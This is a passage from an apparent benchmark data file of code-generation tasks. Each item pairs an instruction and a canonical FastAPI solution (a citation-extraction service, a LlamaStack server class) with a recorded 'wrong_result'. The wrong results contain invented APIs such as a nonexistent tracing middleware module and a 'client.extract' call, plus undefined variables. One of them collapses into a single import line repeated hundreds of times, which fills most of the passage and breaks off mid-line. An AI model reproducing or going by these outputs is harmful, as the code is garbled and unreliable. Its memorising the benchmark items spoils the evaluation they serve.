None:\n            yield from s.spans()\n\n    def get_spans(self, context):\n        if self.substring_quotes:\n            for quote in self.substring_quotes:\n                yield from self._get_span(quote, context)\n\nclass QuestionAnswer(OpenAISchema, MultiTaskBase):\n    question: str = Field(..., description=\"Question that was asked\")\n    tasks: list[Fact] = Field(\n        ...,\n        description=\"Body of the answer, each fact should be its separate object with a body and a list of sources\",\n    )\n\nQuestionAnswer.task_type = Fact\n\nclass Question(BaseModel):\n    context: str = Field(..., description=\"Context to extract answers from\")\n    query: str = Field(..., description=\"Question to answer\")\n\nclass ExtractionService:\n    def __init__(self):\n        self.app = FastAPI(title=\"Citation with Extraction\")\n        self._setup_routes()\n\n    def _setup_routes(self):\n        @self.app.post(\"/extract\", response_class=StreamingResponse)\n        async def extract(question: Question, openai_key: str = Depends(self.get_api_key)):\n            facts = self.stream_extract(question)\n            async def generate():\n                for fact in facts:\n                    logger.info(f\"Fact: {fact}\")\n                    spans = list(fact.get_spans(question.context))\n                    resp = {\n                        \"body\": fact.fact,\n                        \"spans\": spans,\n                        \"citation\": [question.context[a:b] for (a, b) in spans],\n                    }\n                    resp_json = json.dumps(resp)\n                    yield f\"data: {resp_json}\"\n                yield \"data: [DONE]\"\n            return StreamingResponse(generate(), media_type=\"text/event-stream\")\n\n    def stream_extract(self, question: Question) -> Iterable[Fact]:\n        completion = client.chat.completions.create(\n            model=\"gpt-3.5-turbo-0613\",\n            temperature=0,\n            stream=True,\n            functions=[QuestionAnswer.openai_schema],\n            function_call={\"name\": QuestionAnswer.openai_schema[\"name\"]},\n            messages=[\n                {\n                    \"role\": \"system\",\n                    \"content\": \"You are a world class algorithm to answer questions with correct and exact citations.\",\n                },\n                {\"role\": \"user\", \"content\": \"Answer question using the following context\"},\n                {\"role\": \"user\", \"content\": f\"{question.context}\"},\n                {\"role\": \"user\", \"content\": f\"Question: {question.query}\"},\n                {\n                    \"role\": \"user\",\n                    \"content\": \"Tips: Make sure to cite your sources, and use the exact words from the context.\",\n                },\n            ],\n            max_tokens=2000,\n        )\n        return QuestionAnswer.from_streaming_response(completion)\n\n    def get_api_key(self, request: Request):\n        if \"OPENAI_API_KEY\" in os.environ:\n            return os.environ[\"OPENAI_API_KEY\"]\n        auth = request.headers.get(\"Authorization\")\n        if auth is None:\n            raise HTTPException(status_code=401, detail=\"Missing Authorization header\")\n        if auth.startswith(\"Bearer \"):\n            return auth.replace(\"Bearer \", \"\")\n        return None",
    "Code_level": "Class-level",
    "FSMID_for_test": 61,
    "wrong_result": "```python\nfrom fastapi import FastAPI, Request, HTTPException\nfrom fastapi.responses import StreamingResponse\nfrom openai import OpenAI\nfrom typing import Iterable\nfrom pydantic import BaseModel\n\napp = FastAPI()\nclient = OpenAI(api_key=\"\")\n\nclass Question(BaseModel):\n    question: str\n    context: str\n\nclass Fact(BaseModel):\n    text: str\n    citation: str\n\n@app.on_event(\"startup\")\nasync def startup_event():\n    global client\n    client = OpenAI(api_key=\"\")\n\n@app.on_event(\"shutdown\")\nasync def shutdown_event():\n    global client\n    client = None\n\n@app.get(\"/extract\")\nasync def extract(question: Question, openai_key: str = \"\"):\n    if not openai_key:\n        openai_key = get_api_key(request)\n    try:\n        return StreamingResponse(stream_extract(question), media_type=\"text/plain\")\n    except Exception as e:\n        raise HTTPException(status_code=500, detail=str(e))\n\ndef stream_extract(question: Question) -> Iterable[Fact]:\n    global client\n    for fact in client.extract(question.question, question.context):\n        yield f\"{fact.text} ({fact.citation})\"\n\ndef get_api_key(request: Request) -> str:\n    openai_key = request.headers.get(\"OpenAI-Key\")\n    if not openai_key:\n        openai_key = os.getenv(\"OPENAI_API_KEY\")\n    if not openai_key:\n        raise HTTPException(status_code=401, detail=\"OpenAI API key not provided\")\n    return openai_key\n```"
  },
  {
    "Task_id": 125,
    "Instruction": "Task Description: Create a FastAPI-based HTTP server implementation that handles dynamic route creation, exception translation, and streaming responses, with built-in tracing middleware for request monitoring.\n\nClass Description: LlamaStackServer is a configurable HTTP server implementation using FastAPI that provides dynamic route creation, exception handling, and support for streaming responses (SSE). It includes middleware for request tracing and manages the lifecycle of implementation components.\n\nAttributes:\n\nconfig: [dict] - Configuration dictionary for server setup\napp: [FastAPI] - Main FastAPI application instance\nimpls: [Optional[dict]] - Dictionary of implementation components managed by the server\n\nMethods:\n\n__init__: [Name](config: dict) -> [None] - Initializes the server with given configuration and sets up FastAPI app with tracing middleware\nlifespan: [Name](app: FastAPI) -> [AsyncContextManager] - Async context manager for server lifecycle (startup/shutdown)\nglobal_exception_handler: [Name](request: Request, exc: Exception) -> [JSONResponse] - Handles all uncaught exceptions and translates them to HTTP responses\ntranslate_exception: [Name](exc: Exception) -> [Union[HTTPException, RequestValidationError]] - Converts Python exceptions to appropriate HTTP exceptions\ncreate_dynamic_typed_route: [Name](func: Any, method: str) -> [Callable] - Creates a FastAPI route handler with proper typing and parameter handling\nis_streaming_request: [Name](func_name: str, request: Request, **kwargs) -> [bool] - Determines if a request should be handled as a streaming response\nmaybe_await: [Name](value: Any) -> [Coroutine] - Helper method to await coroutines or return values directly\nsse_generator: [Name](event_gen: AsyncGenerator) -> [AsyncGenerator] - Converts an async generator to Server-Sent Events (SSE) format\ncreate_sse_event: [Name](data: Any) -> [str] - Formats data as an SSE event string",
    "Canonical_solution": "from fastapi import Body, FastAPI, HTTPException, Request\nfrom fastapi.responses import JSONResponse, StreamingResponse\nfrom pydantic import BaseModel\nfrom typing import Any, Union\nimport asyncio\nimport inspect\nimport json\nfrom typing_extensions import Annotated\n\nclass TracingMiddleware:\n    def __init__(self, app):\n        self.app = app\n\n    async def __call__(self, scope, receive, send):\n        path = scope[\"path\"]\n        await start_trace(path, {\"__location__\": \"server\"})\n        try:\n            return await self.app(scope, receive, send)\n        finally:\n            await end_trace()\n\nclass LlamaStackServer:\n    def __init__(self, config):\n        self.config = config\n        self.app = FastAPI(lifespan=self.lifespan)\n        self.app.add_middleware(TracingMiddleware)\n        self.impls = None\n\n    @asynccontextmanager\n    async def lifespan(self, app: FastAPI):\n        print(\"Starting up\")\n        yield\n        print(\"Shutting down\")\n        for impl in app.__llama_stack_impls__.values():\n            await impl.shutdown()\n\n    async def global_exception_handler(self, request: Request, exc: Exception):\n        traceback.print_exception(exc)\n        http_exc = self.translate_exception(exc)\n        return JSONResponse(\n            status_code=http_exc.status_code, \n            content={\"error\": {\"detail\": http_exc.detail}}\n        )\n\n    def translate_exception(self, exc: Exception) -> Union[HTTPException, RequestValidationError]:\n        if isinstance(exc, ValidationError):\n            exc = RequestValidationError(exc.raw_errors)\n\n        if isinstance(exc, RequestValidationError):\n            return HTTPException(\n                status_code=400,\n                detail={\n                    \"errors\": [\n                        {\n                            \"loc\": list(error[\"loc\"]),\n                            \"msg\": error[\"msg\"],\n                            \"type\": error[\"type\"],\n                        }\n                        for error in exc.errors()\n                    ]\n                },\n            )\n        elif isinstance(exc, ValueError):\n            return HTTPException(status_code=400, detail=f\"Invalid value: {str(exc)}\")\n        elif isinstance(exc, PermissionError):\n            return HTTPException(status_code=403, detail=f\"Permission denied: {str(exc)}\")\n        elif isinstance(exc, TimeoutError):\n            return HTTPException(status_code=504, detail=f\"Operation timed out: {str(exc)}\")\n        elif isinstance(exc, NotImplementedError):\n            return HTTPException(status_code=501, detail=f\"Not implemented: {str(exc)}\")\n        else:\n            return HTTPException(\n                status_code=500,\n                detail=\"Internal server error: An unexpected error occurred.\",\n            )\n\n    def create_dynamic_typed_route(self, func: Any, method: str):\n        async def endpoint(request: Request, **kwargs):\n            set_request_provider_data(request.headers)\n\n            is_streaming = self.is_streaming_request(func.__name__, request, **kwargs)\n            try:\n                if is_streaming:\n                    return StreamingResponse(\n                        self.sse_generator(func(**kwargs)), media_type=\"text/event-stream\"\n                    )\n                else:\n                    value = func(**kwargs)\n                    return await self.maybe_await(value)\n            except Exception as e:\n                traceback.print_exception(e)\n                raise self.translate_exception(e) from e\n\n        sig = inspect.signature(func)\n        new_params = [\n            inspect.Parameter(\n                \"request\", inspect.Parameter.POSITIONAL_OR_KEYWORD, annotation=Request\n            )\n        ]\n        new_params.extend(sig.parameters.values())\n\n        if method == \"post\":\n            new_params = [new_params[0]] + [\n                param.replace(annotation=Annotated[param.annotation, Body(..., embed=True)])\n                for param in new_params[1:]\n            ]\n\n        endpoint.__signature__ = sig.replace(parameters=new_params)\n        return endpoint\n\n    def is_streaming_request(self, func_name: str, request: Request, **kwargs):\n        return kwargs.get(\"stream\", False)\n\n    async def maybe_await(self, value):\n        if inspect.iscoroutine(value):\n            return await value\n        return value\n\n    async def sse_generator(self, event_gen):\n        try:\n            event_gen = await event_gen\n            async for item in event_gen:\n                yield self.create_sse_event(item)\n                await asyncio.sleep(0.01)\n        except asyncio.CancelledError:\n            print(\"Generator cancelled\")\n            await event_gen.aclose()\n        except Exception as e:\n            traceback.print_exception(e)\n            yield self.create_sse_event(\n                {\n                    \"error\": {\n                        \"message\": str(self.translate_exception(e)),\n                    },\n                }\n            )\n\n    def create_sse_event(self, data: Any) -> str:\n        if isinstance(data, BaseModel):\n            data = data.model_dump_json()\n        else:\n            data = json.dumps(data)\n        return f\"data: {data}\\n\\n\"",
    "Code_level": "Class-level",
    "FSMID_for_test": 61,
    "wrong_result": "```python\nfrom typing import Any, AsyncContextManager, Callable, Coroutine, Dict, Optional, Union\nfrom fastapi import FastAPI, Request\nfrom fastapi.responses import JSONResponse, StreamingResponse\nfrom fastapi.exceptions import RequestValidationError\nfrom fastapi.middleware.tracing import TraceMiddleware\nfrom fastapi.encoders import jsonable_encoder\nfrom fastapi.exceptions import HTTPException\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.routing import APIRoute\nfrom fastapi.templating import Jinja2Templates\nfrom fastapi.staticfiles import StaticFiles\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses import StreamingResponse\nfrom fastapi.responses"
  },
  {
    "Task_id": 13,
